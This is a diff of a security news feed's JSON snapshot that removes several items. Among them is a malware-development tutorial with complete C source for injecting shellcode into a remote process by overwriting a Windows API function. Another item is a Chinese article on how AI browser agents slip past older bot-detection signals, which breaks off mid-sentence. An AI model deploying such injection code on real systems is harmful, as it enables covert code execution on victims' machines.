@@ -1,214 +1,20 @@
 {
   "schema_version": 1,
-  "date": "2026-07-17",
-  "generated_at": "2026-07-16T22:11:34.658944+00:00",
-  "item_count": 8,
-  "kinds_included": [
-    "publish"
-  ],
-  "items": [
-    {
-      "id": "a:d7c55b366a7db97c",
-      "kind": "publish",
-      "text": "unknowncheats-ac published: Looking for an alternative of Themida/VMProtect that someone made",
-      "actor": "unknowncheats-ac",
-      "actor_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
-      "created_at": "2026-07-16T22:09:02.312939+00:00",
-      "html_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/755668-looking-alternative-themida-vmprotect.html",
-      "title": "Looking for an alternative of Themida/VMProtect that someone made",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/755668-looking-alternative-themida-vmprotect.html",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-07-16T22:09:47.850312+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "UnknownCheats Anti-Cheat",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:80be1f6a6462ae93",
-      "kind": "publish",
-      "text": "unknowncheats-ac published: [Plugin] ShowComments (Pseudocode Edition) — fork for IDA 9.3 / Qt6, lists decompiler",
-      "actor": "unknowncheats-ac",
-      "actor_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
-      "created_at": "2026-07-16T22:09:02.312939+00:00",
-      "html_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762606-plugin-showcomments-pseudocode-edition-fork-ida-9-3-qt6-lists-decompiler.html",
-      "title": "[Plugin] ShowComments (Pseudocode Edition) — fork for IDA 9.3 / Qt6, lists decompiler",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762606-plugin-showcomments-pseudocode-edition-fork-ida-9-3-qt6-lists-decompiler.html",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-07-16T22:09:58.706617+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "UnknownCheats Anti-Cheat",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:65cf6e7d085b5f6c",
-      "kind": "publish",
-      "text": "unknowncheats-ac published: Lets talk about the best injection for payloads",
-      "actor": "unknowncheats-ac",
-      "actor_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
-      "created_at": "2026-07-16T22:09:02.312939+00:00",
-      "html_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762523-talk-injection-payloads.html",
-      "title": "Lets talk about the best injection for payloads",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762523-talk-injection-payloads.html",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-07-16T22:10:09.565908+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "UnknownCheats Anti-Cheat",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:7a4aed98a60c206a",
-      "kind": "publish",
-      "text": "aff-wg published: LSH delish",
-      "actor": "aff-wg",
-      "actor_url": "https://aff-wg.org/",
-      "created_at": "2026-07-16T13:00:00+00:00",
-      "html_url": "https://aff-wg.org/2026/07/16/lsh-delish/",
-      "title": "LSH delish",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "Another\nCrystal Palace\nand\nTradecraft Garden\nrelease is now available. This release fills some gaps from recent releases and rounds out the feature set (aka, stuff I wanted to ship, but didn’t get to in time).\nLanguage-specific Handlers\nTwo releases ago, I\nadded\nstack unwinding meta-info generation to Crystal Palace. My original goal was to provide a tool to help\nrestore OS-compliant walkable call stacks\nto programs. But, I left one opportunity on the table.\nThe stack unwinding meta-information is also our opportunity to, function by function, specific a\nlanguage-specific exception handler\n(LSH). The purpose of the LSH is to give a language runtime the opportunity to act on an exception and delegate it to something specified by that program.\nLSHs\nget invoked\nwhen there’s an exception. VEH gets first dibs. If no VEH swallows the exception, the operating system then unwinds the stack of the thread where the exception originated. Each frame’s stack unwinding meta-information is consulted, looking for a LSH. Where there’s a LSH, it’s invoked and it has the opportunity to act on the exception or let the process continue.\nTo setup a LSH, use the catch command:\ncatch \"function\" \"lsh_handler\"\nThe LSH prototype looks a lot like a vectored exception handler and it seems they can do a lot of the same things:\nEXCEPTION_DISPOSITION handler(\nIN PEXCEPTION_RECORD ExceptionRecord,\nIN ULONG64 EstablisherFrame,\nIN OUT PCONTEXT ContextRecord,\nIN OUT PDISPATCHER_CONTEXT DispatcherContext);\nI updated\nverify.spec\nand\nverify.c\nfrom Simple Unwind to use a LSH instead of a VEH.\nNote: VEH and LSH do not have compatible return values. LSHs return an\nEXCEPTION_DISPOSITION\nenum value.\nUser-defined Intrinsics\nThis release introduces user-defined intrinsics to Crystal Palace too. An intrinsic is a function call that gets resolved into something else during a program rewriting pass.\nThe syntax:\nintrinsic \"__foo\" $VAR\nThe above defines intrinsic foo and replaces CALL foo with the contents of $VAR.\nOne way I would use this is to pass configuration information to a program, something like:\npack $VAR \"bi\" 0xB8 %value\nThe above creates a MOV eax, %value instruction.\nIn the program, declare __foo() with whatever prototype and call it to get %value:\nDWORD __foo();\nEasier .spec file hooking\nOne of the handy features in Crystal Palace is the ability to hook parts of a .spec file from another .spec file. I use this with @config.spec files. A\nconfiguration .spec file\nis a .spec that evaluates, before the main project, to set global variables and other meta-information.\nCrystal Palace has had a before command for awhile. before hooks a specific command and executes something else before it runs:\nbefore \"command1\" : command2\nThe above was extended a few releases ago and we have before and after. And, the ability to get more specific with the hook. That is, we can match on the command, export type, and file name too.\nOne of the problems with before and after is executing a block of commands from a config.spec file. There was no easy way to do this. The main solution was to create a before or after command for each individual command.\nNow, we have callnear. This command is like call. But, it canonicalizes the target file immediately when the command is parsed. So, when callnear “config.spec” is passed to before or after, it’ll call config.spec relative to our config.spec and not the file we hooked.\nSimple Unwind’s\nverify.spec\nis an example of callnear:\nprocesspic.x64:\n# let's merge in verify.x64.o in our PICO loading PIC\nload \"bin/verify.x64.o\"\nmerge\n# let's designate MyHandler as the \"language-specific exception\" handler for go. This will\n# allow us to \"catch\" the PICO's debug break when it happens. This requires that our PIC's\n# stack unwinding meta-information is registered with the OS (e.g., RtlAddFunctionTable)\ncatch \"go\" \"MyHandler\"\nx64:\n# let's drop an int3 (debug break) before a call to MessageBoxA in our PICO\npack $INT3 \"b\" 0xcc\nbefore \"export\" \"object\" : ised insert \"mov rax, qword ptr [__imp_USER32$MessageBoxA]\" $INT3 +before\n# call the local (to this file) label processpic before we export PIC\nbefore \"export\" \"pic\" : callnear \"verify.spec\" \"processpic\"\nMigration Notes\nNone.\nFeature Tour Video!\nThis project has come a long ways in the past year. And, I appreciate there’s a lot in here and it may not always immediately jump out what that stuff is, why it’s here, and how it works together. To help make some sense of it, I put together a feature tour video too:\nTo see a full list of what’s new, check out the\nrelease notes\n.",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "rss",
-      "content_source_url": "https://aff-wg.org/2026/07/16/lsh-delish/",
-      "content_chars": 4570,
-      "content_sha256": "637dd13e626052e5cbf961e6f91c01f41e5b45818a5454c166308081516b23a0",
-      "content_fetched_at": "2026-07-16T22:10:27.962587+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "Adversary Fan Fiction Writers Guild",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:1f64803436be0573",
-      "kind": "publish",
-      "text": "cocomelonc published: Malware development trick 60: Function stomping (remote process). Simple C example",
-      "actor": "cocomelonc",
-      "actor_url": "https://cocomelonc.github.io/",
-      "created_at": "2026-07-16T02:00:00+00:00",
-      "html_url": "https://cocomelonc.github.io/malware/2026/07/16/malware-tricks-60.html",
-      "title": "Malware development trick 60: Function stomping (remote process). Simple C example",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "﷽\nHello, cybersecurity enthusiasts and white hackers!\nNext one in my blog about remote function stomping.\nremote function stomping\nAll processes that use the DLLs that implement Windows API functions share them. This means that the functions inside the DLL have the same address in all processes. Because each process has its own virtual address space, the DLL’s address will be different from one to the next. So, even though the target function’s value stays the same from one process to the next, the DLL that exports these functions might change.\nFor example,\nkernel32.dll\nwill be shared by two processes,\nA\nand\nB\n. However, because of Address Space Layout Randomization, the address of the DLL may be different in each process. The location of\nVirtualAlloc\n, which comes from\nkernel32.dll\n, will be the same in both processes, though.\nOne important thing to keep in mind is that the DLL that exports the intended function must already be loaded into the target process for function stomping to work. For instance, if you want to target the\nIECreateFile\nfunction in a remote function that comes from\nieframe.dll\n, that source file must already be put into the target process. In the event that Setupapi.dll is not loaded in the remote process, the\nIECreateFile\nfunction will not be present in the target process. This will cause an attempt to write to an address that does not exist.\npractical example\nThe code is similar to the local function stomping code, however, it uses different WinAPI functions to carry out code injection.\nLet’s say our target process is\nnotepad.exe\n. First of all, open\nnotepad.exe\nin\nx64dbg\ndebugger.\nAnd choose some function from\nSymbols\ntab:\nSo, in our code, the first thing that needs to be done is to use\nLoadLibraryA\nto load\nuser.dll\ninto the local process memory. Next, use\nGetProcAddress\nto get the address of the function:\nprintf\n(\n\"loading ... \"\n);\nh\n=\nLoadLibraryA\n(\n\"user32.dll\"\n);\nif\n(\nh\n==\nNULL\n){\nprintf\n(\n\"LoadLibraryA failed: %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"loading user32.dll done\n\\n\n\"\n);\naddr\n=\nGetProcAddress\n(\nh\n,\n\"CallMsgFilterA\"\n);\nif\n(\naddr\n==\nNULL\n){\nprintf\n(\n\"GetProcAddress failed: %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"address Of\n\\\"\n%s\n\\\"\n: 0x%p\n\\n\n\"\n,\n\"CallMsgFilterA\"\n,\naddr\n);\nThe next step would be to stomp on the function and put the payload in its place.\nVirtualProtectEx\nshould be used to mark the function’s memory area as readable and writable so that it can be changed. Finally,\nVirtualProtectEx\nis used to mark the area as executable (RX or RWX). The payload is then put into the function’s address.\nif\n(\n!\nVirtualProtectEx\n(\nph\n,\naddr\n,\nsizeof\n(\nmy_payload\n),\nPAGE_READWRITE\n,\n&\nold\n))\n{\nprintf\n(\n\"VirtualProtectEx [RW] failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nif\n(\n!\nWriteProcessMemory\n(\nph\n,\naddr\n,\nmy_payload\n,\nsizeof\n(\nmy_payload\n),\nNULL\n))\n{\nprintf\n(\n\"WriteProcessMemory failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nif\n(\n!\nVirtualProtectEx\n(\nph\n,\naddr\n,\nsizeof\n(\nmy_payload\n),\nPAGE_EXECUTE_READWRITE\n,\n&\nold\n))\n{\nprintf\n(\n\"VirtualProtectEx [RWX] failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nFor finding target process and get handle just use\nthis\nlogic:\nint\nfindProc\n(\nconst\nchar\n*\nprocname\n)\n{\nHANDLE\nhSnapshot\n;\nPROCESSENTRY32\npe\n;\nint\npid\n=\n0\n;\nBOOL\nhResult\n;\n// snapshot of all processes in the system\nhSnapshot\n=\nCreateToolhelp32Snapshot\n(\nTH32CS_SNAPPROCESS\n,\n0\n);\nif\n(\nINVALID_HANDLE_VALUE\n==\nhSnapshot\n)\nreturn\n0\n;\n// initializing size: needed for using Process32First\npe\n.\ndwSize\n=\nsizeof\n(\nPROCESSENTRY32\n);\n// info about first process encountered in a system snapshot\nhResult\n=\nProcess32First\n(\nhSnapshot\n,\n&\npe\n);\n// retrieve information about the processes\n// and exit if unsuccessful\nwhile\n(\nhResult\n)\n{\n// if we find the process: return process ID\nif\n(\nstrcmp\n(\nprocname\n,\npe\n.\nszExeFile\n)\n==\n0\n)\n{\npid\n=\npe\n.\nth32ProcessID\n;\nbreak\n;\n}\nhResult\n=\nProcess32Next\n(\nhSnapshot\n,\n&\npe\n);\n}\n// closes an open handle (CreateToolhelp32Snapshot)\nCloseHandle\n(\nhSnapshot\n);\nreturn\npid\n;\n}\nAs you can see, to find\nPID\nwe call\nfindProc\nfunction which basically, what it does, it takes the name of the process we want to inject to and try to find it in a memory of the operating system, and if it exists, it’s running, this function return a process\nID\nof that process.\nin the main function you need:\npid\n=\nfindProc\n(\nargv\n[\n1\n]);\nph\n=\nOpenProcess\n(\nPROCESS_ALL_ACCESS\n,\nFALSE\n,\npid\n);\nif\n(\n!\nph\n)\n{\nprintf\n(\n\"failed to open process :(\n\\n\n\"\n);\nreturn\n-\n2\n;\n}\nif\n(\npid\n)\n{\nprintf\n(\n\"target process pid: %d\n\\n\n\"\n,\npid\n);\n}\nFor simplicity, we just print this\nPID\n.\nFinally, full source code is looks like this:\n#include\n<windows.h>\n#include\n<stdio.h>\n#include\n<string.h>\n#include\n<tlhelp32.h>\nint\nfindProc\n(\nconst\nchar\n*\nprocname\n)\n{\nHANDLE\nhSnapshot\n;\nPROCESSENTRY32\npe\n;\nint\npid\n=\n0\n;\nBOOL\nhResult\n;\n// snapshot of all processes in the system\nhSnapshot\n=\nCreateToolhelp32Snapshot\n(\nTH32CS_SNAPPROCESS\n,\n0\n);\nif\n(\nINVALID_HANDLE_VALUE\n==\nhSnapshot\n)\nreturn\n0\n;\n// initializing size: needed for using Process32First\npe\n.\ndwSize\n=\nsizeof\n(\nPROCESSENTRY32\n);\n// info about first process encountered in a system snapshot\nhResult\n=\nProcess32First\n(\nhSnapshot\n,\n&\npe\n);\n// retrieve information about the processes\n// and exit if unsuccessful\nwhile\n(\nhResult\n)\n{\n// if we find the process: return process ID\nif\n(\nstrcmp\n(\nprocname\n,\npe\n.\nszExeFile\n)\n==\n0\n)\n{\npid\n=\npe\n.\nth32ProcessID\n;\nbreak\n;\n}\nhResult\n=\nProcess32Next\n(\nhSnapshot\n,\n&\npe\n);\n}\n// closes an open handle (CreateToolhelp32Snapshot)\nCloseHandle\n(\nhSnapshot\n);\nreturn\npid\n;\n}\n// x64 meow-meow shellcode\nunsigned\nchar\nmy_payload\n[]\n=\n{\n0xfc\n,\n0x48\n,\n0x81\n,\n0xe4\n,\n0xf0\n,\n0xff\n,\n0xff\n,\n0xff\n,\n0xe8\n,\n0xd0\n,\n0x00\n,\n0x00\n,\n0x00\n,\n0x41\n,\n0x51\n,\n0x41\n,\n0x50\n,\n0x52\n,\n0x51\n,\n0x56\n,\n0x48\n,\n0x31\n,\n0xd2\n,\n0x65\n,\n0x48\n,\n0x8b\n,\n0x52\n,\n0x60\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x52\n,\n0x18\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x52\n,\n0x20\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x72\n,\n0x50\n,\n0x3e\n,\n0x48\n,\n0x0f\n,\n0xb7\n,\n0x4a\n,\n0x4a\n,\n0x4d\n,\n0x31\n,\n0xc9\n,\n0x48\n,\n0x31\n,\n0xc0\n,\n0xac\n,\n0x3c\n,\n0x61\n,\n0x7c\n,\n0x02\n,\n0x2c\n,\n0x20\n,\n0x41\n,\n0xc1\n,\n0xc9\n,\n0x0d\n,\n0x41\n,\n0x01\n,\n0xc1\n,\n0xe2\n,\n0xed\n,\n0x52\n,\n0x41\n,\n0x51\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x52\n,\n0x20\n,\n0x3e\n,\n0x8b\n,\n0x42\n,\n0x3c\n,\n0x48\n,\n0x01\n,\n0xd0\n,\n0x3e\n,\n0x8b\n,\n0x80\n,\n0x88\n,\n0x00\n,\n0x00\n,\n0x00\n,\n0x48\n,\n0x85\n,\n0xc0\n,\n0x74\n,\n0x6f\n,\n0x48\n,\n0x01\n,\n0xd0\n,\n0x50\n,\n0x3e\n,\n0x8b\n,\n0x48\n,\n0x18\n,\n0x3e\n,\n0x44\n,\n0x8b\n,\n0x40\n,\n0x20\n,\n0x49\n,\n0x01\n,\n0xd0\n,\n0xe3\n,\n0x5c\n,\n0x48\n,\n0xff\n,\n0xc9\n,\n0x3e\n,\n0x41\n,\n0x8b\n,\n0x34\n,\n0x88\n,\n0x48\n,\n0x01\n,\n0xd6\n,\n0x4d\n,\n0x31\n,\n0xc9\n,\n0x48\n,\n0x31\n,\n0xc0\n,\n0xac\n,\n0x41\n,\n0xc1\n,\n0xc9\n,\n0x0d\n,\n0x41\n,\n0x01\n,\n0xc1\n,\n0x38\n,\n0xe0\n,\n0x75\n,\n0xf1\n,\n0x3e\n,\n0x4c\n,\n0x03\n,\n0x4c\n,\n0x24\n,\n0x08\n,\n0x45\n,\n0x39\n,\n0xd1\n,\n0x75\n,\n0xd6\n,\n0x58\n,\n0x3e\n,\n0x44\n,\n0x8b\n,\n0x40\n,\n0x24\n,\n0x49\n,\n0x01\n,\n0xd0\n,\n0x66\n,\n0x3e\n,\n0x41\n,\n0x8b\n,\n0x0c\n,\n0x48\n,\n0x3e\n,\n0x44\n,\n0x8b\n,\n0x40\n,\n0x1c\n,\n0x49\n,\n0x01\n,\n0xd0\n,\n0x3e\n,\n0x41\n,\n0x8b\n,\n0x04\n,\n0x88\n,\n0x48\n,\n0x01\n,\n0xd0\n,\n0x41\n,\n0x58\n,\n0x41\n,\n0x58\n,\n0x5e\n,\n0x59\n,\n0x5a\n,\n0x41\n,\n0x58\n,\n0x41\n,\n0x59\n,\n0x41\n,\n0x5a\n,\n0x48\n,\n0x83\n,\n0xec\n,\n0x20\n,\n0x41\n,\n0x52\n,\n0xff\n,\n0xe0\n,\n0x58\n,\n0x41\n,\n0x59\n,\n0x5a\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x12\n,\n0xe9\n,\n0x49\n,\n0xff\n,\n0xff\n,\n0xff\n,\n0x5d\n,\n0x49\n,\n0xc7\n,\n0xc1\n,\n0x00\n,\n0x00\n,\n0x00\n,\n0x00\n,\n0x3e\n,\n0x48\n,\n0x8d\n,\n0x95\n,\n0x1a\n,\n0x01\n,\n0x00\n,\n0x00\n,\n0x3e\n,\n0x4c\n,\n0x8d\n,\n0x85\n,\n0x25\n,\n0x01\n,\n0x00\n,\n0x00\n,\n0x48\n,\n0x31\n,\n0xc9\n,\n0x41\n,\n0xba\n,\n0x45\n,\n0x83\n,\n0x56\n,\n0x07\n,\n0xff\n,\n0xd5\n,\n0xbb\n,\n0xe0\n,\n0x1d\n,\n0x2a\n,\n0x0a\n,\n0x41\n,\n0xba\n,\n0xa6\n,\n0x95\n,\n0xbd\n,\n0x9d\n,\n0xff\n,\n0xd5\n,\n0x48\n,\n0x83\n,\n0xc4\n,\n0x28\n,\n0x3c\n,\n0x06\n,\n0x7c\n,\n0x0a\n,\n0x80\n,\n0xfb\n,\n0xe0\n,\n0x75\n,\n0x05\n,\n0xbb\n,\n0x47\n,\n0x13\n,\n0x72\n,\n0x6f\n,\n0x6a\n,\n0x00\n,\n0x59\n,\n0x41\n,\n0x89\n,\n0xda\n,\n0xff\n,\n0xd5\n,\n0x4d\n,\n0x65\n,\n0x6f\n,\n0x77\n,\n0x2d\n,\n0x6d\n,\n0x65\n,\n0x6f\n,\n0x77\n,\n0x21\n,\n0x00\n,\n0x3d\n,\n0x5e\n,\n0x2e\n,\n0x2e\n,\n0x5e\n,\n0x3d\n,\n0x00\n};\nint\nmain\n(\nint\nargc\n,\nchar\n*\nargv\n[])\n{\nint\npid\n=\n0\n;\nPVOID\naddr\n=\nNULL\n;\nHMODULE\nh\n=\nNULL\n;\nHANDLE\nph\n=\nNULL\n;\nHANDLE\nth\n=\nNULL\n;\nDWORD\nold\n=\nNULL\n;\npid\n=\nfindProc\n(\nargv\n[\n1\n]);\nph\n=\nOpenProcess\n(\nPROCESS_ALL_ACCESS\n,\nFALSE\n,\npid\n);\nif\n(\n!\nph\n)\n{\nprintf\n(\n\"failed to open process :(\n\\n\n\"\n);\nreturn\n-\n2\n;\n}\nif\n(\npid\n)\n{\nprintf\n(\n\"target process pid: %d\n\\n\n\"\n,\npid\n);\n}\nprintf\n(\n\"press <Enter> to load user32.dll...\"\n);\ngetchar\n();\nprintf\n(\n\"loading ... \"\n);\nh\n=\nLoadLibraryA\n(\n\"user32.dll\"\n);\nif\n(\nh\n==\nNULL\n){\nprintf\n(\n\"LoadLibraryA failed: %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"loading user32.dll done\n\\n\n\"\n);\naddr\n=\nGetProcAddress\n(\nh\n,\n\"CallMsgFilterA\"\n);\nif\n(\naddr\n==\nNULL\n){\nprintf\n(\n\"GetProcAddress failed: %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"address Of\n\\\"\n%s\n\\\"\n: 0x%p\n\\n\n\"\n,\n\"CallMsgFilterA\"\n,\naddr\n);\nprintf\n(\n\"press <Enter> to write payload ... \"\n);\ngetchar\n();\nprintf\n(\n\"writing payload... \"\n);\nif\n(\n!\nVirtualProtectEx\n(\nph\n,\naddr\n,\nsizeof\n(\nmy_payload\n),\nPAGE_READWRITE\n,\n&\nold\n))\n{\nprintf\n(\n\"VirtualProtectEx [RW] failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nif\n(\n!\nWriteProcessMemory\n(\nph\n,\naddr\n,\nmy_payload\n,\nsizeof\n(\nmy_payload\n),\nNULL\n))\n{\nprintf\n(\n\"WriteProcessMemory failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nif\n(\n!\nVirtualProtectEx\n(\nph\n,\naddr\n,\nsizeof\n(\nmy_payload\n),\nPAGE_EXECUTE_READWRITE\n,\n&\nold\n))\n{\nprintf\n(\n\"VirtualProtectEx [RWX] failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"writing payload: done\n\\n\n\"\n);\nprintf\n(\n\"press <Enter> to run the payload ... \"\n);\ngetchar\n();\nth\n=\nCreateRemoteThread\n(\nph\n,\nNULL\n,\nNULL\n,\naddr\n,\nNULL\n,\nNULL\n,\nNULL\n);\nif\n(\nth\n!=\nNULL\n)\nWaitForSingleObject\n(\nth\n,\nINFINITE\n);\nprintf\n(\n\"press <Enter> to quit ... \"\n);\ngetchar\n();\nreturn\n0\n;\n}\ndemo\nLet’s go to see everything in action.\nCompile our malware:\nx86_64-w64-mingw32-g++\n-O2\nhack.c\n-o\nhack.exe\n-I\n/usr/share/mingw-w64/include/\n-s\n-ffunction-sections\n-fdata-sections\n-Wno-write-strings\n-fno-exceptions\n-fmerge-all-constants\n-static-libstdc\n++\n-static-libgcc\n-fpermissive\nThen run\nnotepad.exe\non victim’s machine and run:\n.\n\\hack.exe\nnotepad.exe\nthen check target address:\nwrite payload:\nfinally, run payload:\nAs you can see, everything is worked perfectly, as expected. Function in the remote process stomped, payload successfully executed! =^..^=\nOnce again, if you try to use function which is not provided by target process you’re failed!\nLike this:\nRemove debugging prints (\nhack2.c\n), then upload this compiled sample to\nANY.RUN\nsandbox:\nAs you can see, verdict:\nsuspicious activity\n.\nhttps://app.any.run/tasks/12cf4f57-3ac4-4467-9305-8644a61b0e2a\nI hope this post is useful for malware researchers, C/C++ programmers, spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.\nThanks to\nANY.RUN\nfor API!\nVBA stomping\nhack2.exe\nsource code in github\nThis is a practical case for educational purposes only.\nThanks for your time happy hacking and good bye!\nPS. All drawings and screenshots are mine",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "rss",
-      "content_source_url": "https://cocomelonc.github.io/malware/2026/07/16/malware-tricks-60.html",
-      "content_chars": 10854,
-      "content_sha256": "b969279d005492d88240d7dd989a94118440c96a9de4464bb11541ec718bf804",
-      "content_fetched_at": "2026-07-16T22:10:19.210366+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "cocomelonc",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:1bf1b08366e324e0",
-      "kind": "publish",
-      "text": "yage-share published: Cloudflare Precursor：AI Agent 用上真实浏览器之后，Bot Detection 看什么",
-      "actor": "yage-share",
-      "actor_url": "https://yage.ai/share/",
-      "created_at": "2026-07-16T00:00:00+00:00",
-      "html_url": "https://yage.ai/share/cloudflare-precursor-agent-detection-20260716.html",
-      "title": "Cloudflare Precursor：AI Agent 用上真实浏览器之后，Bot Detection 看什么",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "AI Agent\n安全与供应链\nAI 产品与平台\nCloudflare 在 2026 年 7 月 13 日发布了 Precursor。它是 Enterprise Bot\nManagement 里的一套客户端行为检测系统，会沿着整段浏览 session\n收集交互信号，区分人类操作与自动化或 agent 行为，并把结果送进 Cloudflare\n原有的挑战、Bot Score 和安全规则。\n这个产品出现的背景，比“Cloudflare 多采集了几种鼠标信号”更重要。AI\nagent 已经可以用 Playwright 驱动真实的\nChrome。网站看到的浏览器是真的，JavaScript\n会正常执行，网络请求也可能来自用户自己的设备。过去那条“浏览器环境正常，所以背后是人”的捷径开始失效。\n我们在 5 月分析\nProject\nMariner 关停\n时，已经看到这条变化。当时 Claude for Chrome、Codex\nComputer Use 和 Chrome auto-browse 都在把 agent\n移进用户的真实设备与浏览器会话，让它共享 Cookie、IP\n和登录状态。这条路线确实避开了独立 VM、云浏览器和 headless 环境最显眼的\nbot 特征。Precursor\n接着回答了下一半问题：环境看起来完全正常以后，网站还能从哪里看出\nagent？\nPrecursor\n给出的答案，是把判断从某个静态属性拉长到整段任务：这个浏览器怎样移动指针、输入文字、切换焦点，前后行为能不能互相解释。它代表的不是\nBot Detection\n从无到有的一次发明，而是检测对象发生了变化。防守方以前主要追问客户端像不像自动化工具，现在还要判断真实浏览器里正在运行的是人，还是\nagent。\nBot Detection 从来不只靠\nCAPTCHA\n最早的人机识别，把判断压在一个检查点上。\nCAPTCHA\n要求访问者完成一项当时对人容易、对机器困难的任务，例如识别扭曲文字。系统不需要理解整段访问，只看这道题能不能答对。\n浏览器指纹把判断往后台移了一步。屏幕分辨率、字体、时区、浏览器 API\n等属性组合起来，可以描述一个客户端环境。EFF 在 2010 年发布的\nPanopticlick\n研究\n显示，这些属性的组合常有很强的辨识力。防守方于是可以检查环境是否自洽，以及它是否带着常见的自动化痕迹。\n随后，风险评分逐渐取代每次都弹出的显式题目。客户端脚本、请求频率、Cookie、页面顺序和账户历史一起进入判断。学术界至少在\n2010 年前后就已经按 session 聚合 Web 日志，分析访问频率、页面路径和 HTTP\n错误。\n相关研究\n后来又把\nWeb 日志与鼠标行为放在一起检测高级 bot。\nCloudflare 自己也早有多层信号。\nJavaScript\nDetections\n检查浏览器环境和脚本执行，\n__cf_bm\n帮助平滑单个访问者的请求模式，Anomaly Detection\n学习站点的正常流量基线，Sequence Rules\n检查接口调用顺序。这些输入最后都可以影响\n每个请求的\nBot Score\n。\n因此，Bot Detection 的历史不是 CAPTCHA、指纹、请求评分和 session\n分析互相替代。新的信号不断加到旧信号上，观察时间也从一次点击延伸到多次请求、账户历史和完整访问。Precursor\n进入的是一条已经存在多年的演进路线。\nBot Detection 的信号逐层叠加：从一次\nCAPTCHA、浏览器指纹和单次请求评分，发展到 Session 行为与声明式 Agent\n身份\n这张图表示信号叠加，不是旧技术退出、新技术接班。到了 agent\n时代，指纹和请求评分仍有用，只是单靠它们越来越难回答操作者是谁。\nBrowser Agent 改变了问题本身\n传统 Web bot 通常执行预先写好的脚本。Browser agent 多了一层 LLM\n推理：它可以阅读页面、规划下一步、调用浏览器工具，遇到错误后再换一种路径。它做的也是人类会做的任务，例如订机票、购物或在论坛发帖。\n这类 agent\n给检测系统带来四个变化。第一，它运行在真实浏览器里，环境属性不再自动暴露其身份。第二，它能处理动态页面和意外分支，不必重复一条固定\nURL 序列。第三，本地 agent 可以从用户设备和住宅网络发出流量，IP\n与网络路径也可能完全正常。第四，robots.txt、User-Agent 和\nWeb Bot Auth\n都依赖\nagent 主动声明；不愿声明的自动化程序仍会伪装成人。\n更麻烦的是，agent\n不天然等于恶意程序。它可能得到用户授权去买票，也可能未经允许抓取内容；一个合法\nagent\n还可能受提示注入影响，开始执行越权动作。网站真正需要分开的，是合法委托、未经许可的自动化和正在发生的危险行为。单一的\nhuman/bot 标签装不下这些差别。\nPlaywright\n淘汰的是一批廉价信号\nPlaywright 是 Browser agent 常用的自动化框架。它可以通过 Chrome\nDevTools Protocol，也就是\nCDP，控制真实浏览器打开页面、点击控件和填写表单。浏览器本身并不假，自动化发生在控制它的那一层。\n这会削弱一批过去成本很低的判断。\nnavigator.webdriver\n可以返回 false，无头浏览器的 User-Agent 可以改写，缺失的多媒体 API\n和粗糙指纹也能补齐。DataDome 的\nGalileo\n研究\n记录了特定 Playwright 版本和路径如何隐藏\nnavigator.webdriver\n。这些信号没有彻底消失，但单独使用时不再可靠。\n真实浏览器仍会留下操作痕迹。agent 可能让指针在 